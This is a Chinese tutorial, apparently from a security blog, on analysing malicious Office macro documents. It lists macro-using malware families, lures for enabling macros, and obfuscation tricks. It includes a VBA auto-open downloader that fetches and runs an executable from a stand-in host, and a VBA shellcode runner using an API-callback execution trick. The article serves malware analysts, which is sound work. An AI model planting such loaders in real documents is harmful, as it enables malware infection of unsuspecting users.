# 恶意代码分析之Office宏代码分析
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 0x00 前言
在之前的文章中，讲述了几个常见的恶意样本的一些常规分析手法。主要使用的工具有exeinfo(查壳)、IDA(静态分析)、od&xdbg32(动态调试)、Systrace&火绒剑(行为分析)等。从本小节开始，文章将讲述不同种类的非PE样本和一些更复杂的PE样本如何调试和分析。关于非PE样本的概述，在之前的文章中已经进行了概要的介绍，目前来讲，非PE样本在攻击链中往往属于重要的部分。在本节中，笔者将详细介绍关于office宏类的非PE样本的分析方法。
## 0x01 Office宏简介
该部分的主要内容来源于19年年底我看到的一个英文论文，原文链接暂时找不到了，后续如果找到了我会贴在评论中。
###  基于宏的攻击活动
目前利用office宏进行攻击应该是一个比较主流的攻击方式了，但是通常情况下，宏代码并不能很好地实现所有的功能，更多的时候，宏代码都是作为一个加载器或者下载器载攻击中发挥作用的。  
有时候，宏代码会直接访问攻击者的C2，下载恶意文件到本地运行。  
有时候，宏代码会解密释放出一个powershell代码，再调用powershell脚本，通过powershell脚本去实现环境检测、文件下载等功能。  
宏代码基于的是VB的语法，如果没有混淆的宏代码阅读起来倒是比较方便，但是现在的大多数宏样本都会有混淆和一些反调试手法，所以在遇到各类宏代码的时候也要根据情况去分析。
###  一些钟爱office宏攻击的家族
**Emotet**
Emotet是一个专注于银行攻击的木马家族，该家族从2014年活跃至今，别是在2019年，每天Emotet都会在全球发送超过十万封钓鱼邮件进行攻击。关于Emotet，是目前比较活跃的银行木马，该组织的攻击样本也比较有特色，之后有机会写一篇文章对该家族的样本进行一个完整的分析。
**FTCODE**
一款由宏作为载体，释放powershell实现的勒索软件，活跃至2019年。
**Sandworm: BlackEnergy / Olympic Destroyer**
sandworm每次攻击的起始都是宏  
2015年和2016年两次袭击乌克兰发电厂，导致停电。2018年攻击平昌冬奥会。
**Other**
除此之外，还有像Dridex、Rovnix、Vawtrak、FIN4、Locky、APT32、TA505、Hancitor、Trickbot、FIN7、Buran、
Ursni、Gozi,、Dreambot、 TA2101/Maze ransomware、 等家族，都会在攻击过程中使用到带有恶意宏代码的office文档。
###  恶意宏如何运行
先来看一个典型的宏利用文档打开的提示：
由于宏的危险性，office通常情况下默认是禁用宏执行的，所以当带有宏的文件打开，就会询问用户是否开启宏，为了让用户在不知情的情况下启用宏，攻击者也是想了很多方式，我大概遇见过这么几种：  
1.在文档中间显示一个模糊的图片，提示用户启用宏才能查看清晰图片。  
2.在文档中伪造安全的机构，比如伪造微软，或者伪造一个杀软的图标，让用户相信这个文档是安全的。  
3.与用户交互，把宏代码的执行设置在用户单击了某个图片或者按钮则提示用户启用宏。
###  恶意宏代码通常被用来做什么
一般来讲，恶意宏代码可以实现以下操作：  
Run Automatically 自动运行  
Download Files 下载文件  
CreateFiles 创建文件  
Execute a file 执行、启动文件  
Run a system command 执行系统命令  
call any dll 调用任意dll  
Inject Shellcode 注入shellcode  
Call any ActiveXObkject 调用任意的ActiveXObject  
Simulate Keystrokes 模拟用户点击  
…
需要注意的是，一个恶意程序可能完全由宏实现，但是更多的情况下，宏用于加载或者下载其他恶意程序。所以对于一个未知的office文档来讲，启用office的宏和打开未知的exe文件一样危险：
一个简单的VBA Downloader（下载者），有时候也称为Dropper（加载器）示例：
    private  Declare Function URLDownloadToFileA Lib "urlmon" 
    (ByVak A AS Long,ByVal B As String , 
    ByVal C As String ,ByVal D As Long ,
    ByVal E As Long ) As Long
    Sub Auto_Open()
        Dim result As Long
        fname = Environ("TEMP") & "agent.exe" 
        result =URLDownloadToFileA(0,"http:compromised.com/payload.exe",fname,0,0)
        Shell fname
    End Sub
这里使用的URLDownloadToFileA来自于系统dll urlmon.dll  
在第六行定义了名为Auto_Open的函数，该函数在文档打开的时候会自动运行（如果允许文档执行宏）  
第八行滴位置，指明了下载文件的存放路径和名称  
第9行的地方调用了URLDownloadToFileA函数，下载文件保存到本地  
第10行的位置执行下载的payload
###  简单的混淆、反调试技术
1.利用ActiveX触发器  
一个典型的例子：[利用InkPicture1_Painted](http://www.greyhathacker.net/?p=948)  
2.隐藏数据  
3.用于隐藏数据的Word文档变量，文档变量可以存储多达64KB的数据，隐藏在MS Word用户界面中。  
4.通过CallByName混淆函数调用  
5.使用WMI运行命令  
6.调用powershell  
7.运行VBScript或者Jscript，运行VBS/JS代码而不将文件写入磁盘  
可参考文档：  
代码示例：  
8.通过API回调运行shellcode
一例通过VBA运行shellcode的实例：
    Private Declare Function createMemory Lib "kernel32" Alias "HeapCreate" (ByVal flOptions As Long, ByVal dwInitialSize As Long, ByVal dwMaximumSize As Long) As Long
    Private Declare Function allocateMemory Lib "kernel32" Alias "HeapAlloc" (ByVal hHeap As Long, ByVal dwFlags As Long, ByVal dwBytes As Long) As Long
    Private Declare Sub copyMemory Lib "ntdll" Alias "RtlMoveMemory" (pDst As Any, pSrc As Any, ByVal ByteLen As Long)
    Private Declare Function shellExecute Lib "kernel32" Alias "EnumSystemCodePagesW" (ByVal lpCodePageEnumProc As Any, ByVal dwFlags As Any) As Long
    Private Sub Document_Open()
    Dim shellCode As String
    Dim shellLength As Byte
    Dim byteArray() As Byte
    Dim memoryAddress As Long
    Dim zL As Long
    zL = 0
    Dim rL As Long
    shellCode = "fce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c1178e34801d1518b592001d38b4918e33a498b348b01d631ffacc1cf0d01c738e075f6037df83b7d2475e4588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe05f5f5a8b12eb8d5d6a018d85b20000005068318b6f87ffd5bbf0b5a25668a695bd9dffd53c067c0a80fbe07505bb4713726f6a0053ffd563616c632e65786500"
    shellLength = Len(shellCode) / 2
    ReDim byteArray(0 To shellLength)
    For i = 0 To shellLength - 1
        If i = 0 Then
            pos = i + 1
        Else
            pos = i * 2 + 1
        End If
        Value = Mid(shellCode, pos, 2)
        byteArray(i) = Val("&H" & Value)
    Next
    rL = createMemory(&H40000, zL, zL)
    memoryAddress = allocateMemory(rL, zL, &H5000)
    copyMemory ByVal memoryAddress, byteArray(0), UBound(byteArray) + 1
    executeResult = shellExecute(memoryAddress, zL)
    End Sub
源代码来自：  
代码的前四行用于引用系统库，调用系统API  
16行处是shellcode的十六进制编码，在这个例子中功能是打开计算器。  
29行处是将shellcode的十六进制编码转换为二进制数据流  
36行处将shellcode copy到了buffer处  
38处执行了shellcode
###  关于office的加密
在97到2003版本的时候，文件加密的概念还不流行，那个时候的宏代码几乎从来没有加密过，2007版本之后，才开始通过加密的方式将VBA代码保护起来  
分享两个解密的工具：  
###  宏代码的分析工具
1.1. 首先可以使用VBA编辑器（比如在office文档里面按alt + F11），通过VBA编辑器可以很方便的调试和跟踪  
这里不得不提一下从VBA编辑器隐藏VBA代码的技巧：